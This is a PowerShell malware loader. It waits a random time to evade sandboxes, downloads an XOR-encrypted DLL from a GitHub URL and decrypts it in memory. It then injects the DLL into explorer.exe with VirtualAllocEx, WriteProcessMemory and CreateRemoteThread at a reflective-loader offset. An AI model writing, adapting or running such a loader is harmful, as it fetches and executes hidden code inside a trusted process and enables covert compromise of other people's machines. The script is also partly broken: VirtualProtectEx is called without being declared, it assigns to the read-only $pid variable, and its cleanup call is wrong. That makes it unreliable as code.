#Requires -Version 3.0

# Configuration
$XOR_KEY = 0x71
$DLL_URL = "https://raw.githubusercontent.com/Alon1123/Projects/main/stealth.enc"  # Replace with your URL
$LOADER_OFFSET = 0x1000  # Adjust based on your DLL (objdump -x stealth.dll | grep ReflectiveLoader)

# API Function Definitions
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, IntPtr address, uint size, uint type, uint protect
    );
    
    [DllImport("kernel32")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, IntPtr address, byte[] buffer, uint size, out IntPtr written
    );
    
    [DllImport("kernel32")]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, IntPtr attrs, uint stackSize, 
        IntPtr startAddress, IntPtr param, uint flags, out IntPtr threadId
    );
    
    [DllImport("kernel32")]
    public static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);
}
"@

# Compile API class in memory
Add-Type -TypeDefinition $Win32 -Language CSharp

# Anti-sandbox delay
Start-Sleep -Milliseconds (Get-Random -Minimum 1000 -Maximum 3000)

# Get trusted process (explorer.exe)
try {
    $target = Get-Process -Name explorer -ErrorAction Stop
    $pid = $target.Id
} catch {
    Write-Error "No explorer process found"
    exit
}

# Download and decrypt DLL
try {
    $encrypted = (Invoke-WebRequest -Uri $DLL_URL -UseBasicParsing).Content
    $dllBytes = [byte[]]::new($encrypted.Length)
    for ($i=0; $i -lt $encrypted.Length; $i++) {
        $dllBytes[$i] = $encrypted[$i] -bxor $XOR_KEY
    }
} catch {
    Write-Error "DLL download failed: $_"
    exit
}

# Open target process
$hProcess = [Win32]::OpenProcess(0x1F0FFF, $false, $pid)  # PROCESS_ALL_ACCESS
if ($hProcess -eq [IntPtr]::Zero) {
    Write-Error "OpenProcess failed (Error: $([Runtime.InteropServices.Marshal]::GetLastWin32Error()))"
    exit
}

# Allocate memory (RW first, then RX)
$memSize = $dllBytes.Length
$remoteMem = [Win32]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $memSize, 0x3000, 0x04)  # MEM_COMMIT|RESERVE, PAGE_READWRITE
if ($remoteMem -eq [IntPtr]::Zero) {
    Write-Error "VirtualAllocEx failed"
    exit
}

# Write DLL to target
$written = [IntPtr]::Zero
$success = [Win32]::WriteProcessMemory($hProcess, $remoteMem, $dllBytes, $memSize, [ref]$written)
if (!$success -or $written -ne $memSize) {
    Write-Error "WriteProcessMemory failed"
    exit
}

# Change protection to RX
$oldProtect = 0
$vpSuccess = [Win32]::VirtualProtectEx($hProcess, $remoteMem, $memSize, 0x20, [ref]$oldProtect)  # PAGE_EXECUTE_READ
if (!$vpSuccess) {
    Write-Error "VirtualProtectEx failed"
}

# Calculate loader address
$loaderAddr = [IntPtr]($remoteMem.ToInt64() + $LOADER_OFFSET)

# Execute
$threadId = [IntPtr]::Zero
$hThread = [Win32]::CreateRemoteThread(
    $hProcess, [IntPtr]::Zero, 0, $loaderAddr, [IntPtr]::Zero, 0, [ref]$threadId
)

if ($hThread -eq [IntPtr]::Zero) {
    Write-Error "CreateRemoteThread failed"
} else {
    # Wait for execution
    [Win32]::WaitForSingleObject($hThread, 5000) | Out-Null
    Write-Host "[+] Injection successful! Thread ID: $($threadId)"
}

# Cleanup (optional)
[Runtime.InteropServices.Marshal]::ZeroFreeGlobalAllocUnicode($remoteMem)